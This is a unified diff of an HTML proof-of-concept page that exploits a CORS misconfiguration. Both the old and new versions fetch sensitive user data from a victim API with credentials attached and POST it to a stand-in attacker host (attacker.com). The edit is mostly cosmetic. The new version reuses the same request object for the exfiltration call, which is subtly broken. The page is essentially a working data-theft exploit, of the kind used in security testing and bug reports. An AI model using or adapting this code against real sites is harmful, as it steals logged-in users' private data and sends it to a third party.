@@ -1,28 +1,21 @@
-<!DOCTYPE html>
 <html>
   <body>
-    <button type="button" onclick="cors()">CORS</button>
-    <p id="demo"></p>
-
+    <button type='button' onclick='cors()'>CORS</button>
+    <p id='demo'></p>
     <script>
       function cors() {
         var xhttp = new XMLHttpRequest();
-
-        xhttp.onreadystatechange = function () {
+        xhttp.onreadystatechange = function() {
           if (this.readyState == 4 && this.status == 200) {
             var a = this.responseText; // Sensitive data from the application
             document.getElementById("demo").innerHTML = a;
-
-            // Send the data to the attacker's server
-            var exfil = new XMLHttpRequest();
-            exfil.open("POST", "https://attacker.com/collect", true); // Replace with attacker's server
-            exfil.withCredentials = true;
+            xhttp.open("POST", "https://attacker.com", true); // Sending that data to Attacker's website
+            xhttp.withCredentials = true;
             console.log(a);
-            exfil.send("data=" + encodeURIComponent(a));
+            xhttp.send("data=" + a);
           }
         };
-
-        xhttp.open("GET", "https://vulnerable-victim.com/api/userinfo", true); // Replace with actual vulnerable API
+        xhttp.open("GET", "https://target.com/endpoint", true);
         xhttp.withCredentials = true;
         xhttp.send();
       }
